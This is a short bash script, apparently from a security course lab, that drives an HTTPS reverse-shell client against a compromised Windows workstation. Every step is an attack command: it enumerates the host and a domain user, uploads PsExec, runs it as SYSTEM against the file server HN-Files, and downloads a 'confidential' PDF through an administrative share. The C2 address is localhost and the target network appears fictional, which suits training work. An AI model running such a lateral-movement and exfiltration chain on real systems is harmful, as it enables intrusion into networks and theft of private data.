#!/bin/bash

# Author: Justin Shultz
# ID: m8rZr5w8rON0ii9RiwOdQyzmNtB3
# Lab: Write a HTTPS reverse-shell as a Windows executable

# Description: This script automates the process of testing the HTTPS reverse-shell.
echo "ls"
ls
sleep 0.5
echo "ls files"
ls files
sleep 0.5

# Get hostname and user's current group
bash yad_msg.bash "Get hostname and user's current group" 5
./rsh schedule --addr "https://127.0.0.1:9000" --id "testcmd" --run "exec" hostname
./rsh schedule --addr "https://127.0.0.1:9000" --id "groups" --run "exec" net user young.zaffina /domain

# Upload PsExec to the target machine
bash yad_msg.bash "Upload PsExec to the target machine" 5
./rsh schedule --addr "https://127.0.0.1:9000" --id "PsExec" --run "upload" c:/windows/temp/pe64.exe pe64.exe

# Execute PsExec on the target machine
bash yad_msg.bash "Execute PsExec on the target machine" 5
./rsh schedule --addr "https://127.0.0.1:9000" --id "PsExec" --run "exec" c:/windows/temp/pe64.exe \\\\HN-Files -s -accepteula hostname

# Download confidential file from HN-Files fileshare
bash yad_msg.bash "Download confidential file from HN-Files fileshare" 5
./rsh schedule --addr "https://127.0.0.1:9000" --id "confidential" --run "download" \\\\HN-Files/C\$/Shares/Documents/S3krets/CIA/UFOs/DOC_0005517787.pdf confidential.pdf

# View output from scheduled commands
bash yad_msg.bash "View output from scheduled commands" 5
cat results/Young.Zaffina-HN-WKS-01.txt
